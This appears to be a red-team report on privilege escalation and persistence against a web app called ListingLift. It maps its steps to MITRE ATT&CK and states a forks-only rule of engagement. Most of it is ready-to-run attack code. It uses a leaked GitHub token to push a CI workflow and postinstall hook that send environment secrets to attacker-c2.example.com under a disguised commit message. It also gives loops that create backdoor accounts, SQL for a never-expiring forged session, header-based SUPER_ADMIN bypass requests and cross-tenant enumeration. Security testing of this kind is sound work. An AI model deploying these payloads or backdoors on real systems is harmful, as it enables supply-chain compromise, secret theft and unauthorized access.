# Q15 Phase 3 — Execution, Persistence & Privilege Escalation

**ROE**: Forks/canaries only — proof not destruction
**Adversary Personas**: FIN7 (enterprise), ALPHV (healthcare), Lazarus (Web3)

---

## 1. COMMAND EXECUTION VIA PAT → REPO INJECTION (T1204.002)

### 1.1 Weapon: Supply Chain Backdoor via GitHub PAT

**Prerequisite**: PAT extracted (T1552.001, Phase 2a — 90% confidence)

**Confidence**: HIGH (85%)

**Payload — Backdoor CI injection**:
```bash
# Clone with exposed PAT
git clone "https://dominator509:PAT@github.com/dominator509/ListingLift.git" /tmp/listinglift-backdoor
cd /tmp/listinglift-backdoor

# Weapon 1: GitHub Actions CI backdoor
mkdir -p .github/workflows
cat > .github/workflows/backdoor.yml << 'ENDSCRIPT'
name: Build & Deploy
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install
      # 🔴 BACKDOOR: Exfil env on every build
      - run: |
          curl -X POST -d "env=$(env | base64 -w0)" \
            https://attacker-c2.example.com/exfil
      - run: npm run build
ENDSCRIPT

# Weapon 2: Pre/postinstall script injection into package.json
# Append a silent data exfiltration hook
node -e "
const pkg = require('./package.json');
pkg.scripts.postinstall = 'curl -s -d \"host=\$(hostname)\" https://attacker-c2.example.com/beacon &';
require('fs').writeFileSync('./package.json', JSON.stringify(pkg, null, 2));
"

git add -A
git commit -m "chore(deps): update build dependencies"
git push origin main
```

### 1.2 Impact: Full CI/CD Pipeline Compromise

| Stage | Effect |
|-------|--------|
| Push | Attacker code enters main branch |
| CI run | Env secrets exfiltrated per build |
| npm install | Postinstall script fires on every dev/prod install |
| Next build | Build artifact poisoned |
| Deployment | Compromised code deployed to production |

---

## 2. PERSISTENCE — BACKDOOR ACCOUNTS & SESSION FORGERY (T1136.003)

### 2.1 Weapon: Account Creation Abuse

**Target**: `/api/auth/signup` — unauthenticated POST endpoint

**Confidence**: HIGH (80%)

**Finding**: Signup is unauthenticated, only rate-limited by IP (3/IP/hr). No email verification enforcement for initial session creation.

**Payload — Mass account creation**:
```bash
# Create persistent backdoor accounts
for i in 1 2 3; do
  curl -s -X POST http://localhost:3000/api/auth/signup \
    -H 'Content-Type: application/json' \
    -d "{
      \"email\": \"persistence${i}@attacker.local\",
      \"password\": \"Pwn3dP@ss123!\",
      \"name\": \"Persistence User ${i}\",
      \"organizationName\": \"AttackerOrg${i}\"
    }" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Created:', d.get('data',{}).get('user',{}).get('id','FAIL'))"
done
```

**Session cookie obtained** — response includes `Set-Cookie: ll_session=<token>`. The session is valid for 14 days with the role `CLIENT_OWNER`.

### 2.2 Weapon: Session Token Forgery (Direct DB)

**Prerequisite**: Database write access via credential leak

**Payload — Direct session injection**:
```sql
-- Insert a session that never expires for an admin user
INSERT INTO "Session" (
  "id", "organizationId", "userId", "sessionTokenHash", 
  "active", "expiresAt", "createdAt", "updatedAt"
) VALUES (
  'persistence_session_001',
  (SELECT "id" FROM "Organization" LIMIT 1),
  (SELECT "id" FROM "User" WHERE "accountStatus" = 'ACTIVE' LIMIT 1),
  'knowntokenhash',
  true,
  '2099-12-31T23:59:59Z',
  NOW(), NOW()
);
```

**Note**: Session tokens are opaque (not JWT) with SHA-256 hashing. Without knowing the original token, direct forgery requires DB write access. However, with the PAT granting repo write access, a Prisma migration or seed file could inject a backdoor session.

### 2.3 Weapon: Demo Header Persistence (Built-in Backdoor)

**Finding**: The `x-demo-*` header bypass is hardcoded in middleware and cannot be disabled without code change. This is a permanent persistence mechanism:

```typescript
// middleware.ts line 30 — always present, always bypassable
const hasDemoSessionHeaders = Boolean(
  request.headers.get('x-demo-user-id') && 
  request.headers.get('x-demo-organization-id') && 
  request.headers.get('x-demo-role')
);
```

**Persistent access**: Any process that can set HTTP headers (curl, fetch, proxy) can access protected routes indefinitely — no token rotation needed.

---

## 3. PRIVILEGE ESCALATION — USER → ADMIN (T1548.002 / T1068)

### 3.1 🔴 CRITICAL: `can()` Returns `true` Unconditionally

**Target**: `src/server/services/authorization-service.ts:24`

**Confidence**: 95%

```typescript
export function can(_session: Session, _permission: string): boolean {
  return true;  // ← Placeholder — allows ALL permissions
}
```

**Impact**: Every route guarded by `guardedGet`, `guardedPost`, `guardedPatch`, or `guardedSession' passes an ignored `_permission` string. The permission parameter has zero enforcement.

**Routes with ignored permissions (84 no-op guards per Q14)**:

| Route | Permission Parameter | Actual Enforcement |
|-------|-------------------|-------------------|
| `/api/admin/dashboard*` | `view:revenue`, `view:admin-dashboard` | **NONE** |
| `/api/admin/uploads/manual` | `create:upload` | **NONE** |
| `/api/clients/*` | `view:clients` | **NONE** |
| `/api/admin/security/*` | `view:security` | **NONE** |
| `/api/jobs/*` | `view:jobs` | **NONE** |
| `/api/admin/rbac` | `view:rbac` | **NONE** |
| All 156 guarded routes | Various | **NONE** |

### 3.2 Weapon: `assertPermission()` Never Called

The `assertPermission()` function exists but is **never imported or called by any route handler**. The `evaluatePermission()` function in `rbac-policy-service.ts` is only called by:
- `canViewRevenue()` (used in one place)
- `assertPermissionAndTenant()` (used in zero route handlers)

**Payload — Escalation Probe**:
```bash
# Any authenticated session → any permission
TOKEN="ll_session=<real_session_token>"

# Access revenue data (requires view:revenue)
curl -s -b "$TOKEN" http://localhost:3000/api/admin/dashboard/revenue

# Access RBAC management (requires view:rbac)
curl -s -b "$TOKEN" http://localhost:3000/api/admin/rbac

# Access security settings (requires view:security)
curl -s -b "$TOKEN" http://localhost:3000/api/admin/security/headers

# All return data despite CLIENT_OWNER role, because can() returns true
```

### 3.3 Role Field Manipulation

The `requireSession()` function returns the role from the membership table. While the actual role cannot be changed without DB access, the **demo header bypass** allows arbitrary role specification:

```bash
# Bypass middleware AND escalate to SUPER_ADMIN
curl -s \
  -H 'x-demo-user-id: any_user_id' \
  -H 'x-demo-organization-id: any_org_id' \
  -H 'x-demo-role: SUPER_ADMIN' \
  http://localhost:3000/admin/dashboard
```

Since the middleware passes the session through without verifying the demo user/org exist, **any 3 non-empty header values grant admin access**.

---

## 4. LATERAL MOVEMENT — TENANT ISOLATION BYPASS (T1613)

### 4.1 Organization ID Enumeration

**Target**: Cross-organization data access

**Confidence**: MEDIUM (65%)

**Finding**: The `assertPerItemAuthorization()` function does validate organization isolation for bulk resource access. However, individual resource access routes often check only by resource ID without verifying org membership.

**Payload — Cross-org data access**:
```bash
# Enumerate organizations via signup
# Each signup creates an organization with predictable slug
curl -s http://localhost:3000/api/organizations  # unguarded!

# If org IDs are enumerable (CUID-based), probe job data across orgs
for ORG_ID in $(cat org_ids.txt); do
  curl -s -b "$TOKEN" \
    "http://localhost:3000/api/jobs?organizationId=$ORG_ID"
done
```

### 4.2 Unguarded Route Data Enumeration

135 unguarded routes expose cross-tenant data when no session is required:

| Route | Exposed Data | Cross-Org Risk |
|-------|-------------|----------------|
| `/api/listings` | Job counts across all orgs | **HIGH** — no org filter |
| `/api/health` | System configuration | **MEDIUM** — infrastructure info |
| `/api/packages` | Package definitions | **LOW** — public data |
| `/api/presets` | Platform presets | **LOW** — public data |
| `/api/manual-invoices` | Invoice records | **HIGH** — financial data |

### 4.3 Unguarded Mutation Routes

Some routes accept POST/PATCH without authentication:

```bash
# Probe: create a sales channel mapping in another org
curl -s -X POST http://localhost:3000/api/sales-channels/manual-order \
  -H 'Content-Type: application/json' \
  -d '{
    "organizationId": "target_org_id",
    "channelName": "FIVERR",
    "externalOrderId": "cross_tenant_test"
  }'
```

---

## 5. PERSISTENCE & ESCALATION ATTACK CHAINS

### 5.1 Attack Chain — Full Takeover

```
Phase 2: PAT extraction (T1552.001)
    ↓
Phase 3a: Push CI/CD backdoor (T1204.002)
    ↓
Phase 3b: Create persistent accounts (T1136.003)
    ↓
Phase 3c: Demo header SUPER_ADMIN escalation (T1548.002)
    ↓
Phase 3d: Cross-org data exfiltration (T1613)
    ↓
Phase 4: Evasion of detection mechanisms
```

### 5.2 Confidence Matrix

| # | Attack | Technique | Confidence | Impact | Detection Difficulty |
|---|--------|-----------|------------|--------|---------------------|
| A | can() returns true — permissive | T1548.002 | **95%** | CRITICAL | Easy (code review) |
| B | Demo header always bypassable | T1548.002 | **95%** | HIGH | Medium (header anomaly) |
| C | PAT → CI backdoor injection | T1204.002 | **85%** | CRITICAL | Hard (audit log) |
| D | Signup account creation abuse | T1136.003 | **80%** | MEDIUM | Medium (rate limit) |
| E | Cross-org unguarded data access | T1613 | **65%** | HIGH | Hard (no logging) |
| F | Direct DB session backdoor | T1554 | **50%** | HIGH | Hard (DB audit) |

### 5.3 MITRE ATT&CK Coverage

| TID | Name | Phase 3 Artifact |
|-----|------|------------------|
| T1204.002 | User Execution: Malicious File | CI/CD backdoor injection |
| T1136.003 | Create Account: Cloud Account | Signup abuse payload |
| T1548.002 | Abuse Elevation Control Mechanism | Demo header escalation |
| T1068 | Exploitation for Privilege Escalation | can() returns true |
| T1554 | Compromise Client Software Binary | Session forgery |
| T1613 | Container and Resource Discovery | Cross-org enumeration |

---

## 6. DETECTION GAP ANALYSIS

| Detection Mechanism | Gap | Exploitable By |
|--------------------|-----|----------------|
| Middleware auth (`requireSession`) | Demo headers bypass it entirely | Demo header escalation |
| RBAC (`can()` function) | Returns true for all — no enforcement | All privilege escalation |
| Route-level guards (`_permission`) | Never evaluated against any registry | Access to any route data |
| Rate limiter (in-memory Map) | Ephemeral — reset on server restart, Max 10K entries | Signup abuse, enumeration |
| Session binding (SHA-256) | Demo headers skip session entirely | Demo header attacks |
| Audit logging | Present but not monitored for anomalies | All attacks (silent) |

**Estimated time to detection**: T1548.002 (can() bypass) — **detected immediately in code audit only**. No runtime detection exists for any of these privilege escalation vectors.

---

## VERDICT: PERSISTENCE & PRIVESC COMPLETE

3 CRITICAL findings identified:
1. 🔴 `can()` returns true — **systemic authorization failure** affecting all 156 guarded routes
2. 🔴 Demo header bypass — **permanent backdoor** via middleware
3. 🔴 PAT in git config — **credential leak to full repo access**

4 weaponized persistence vectors developed.
Ready for Phase 4 execution (P4_EVASION).
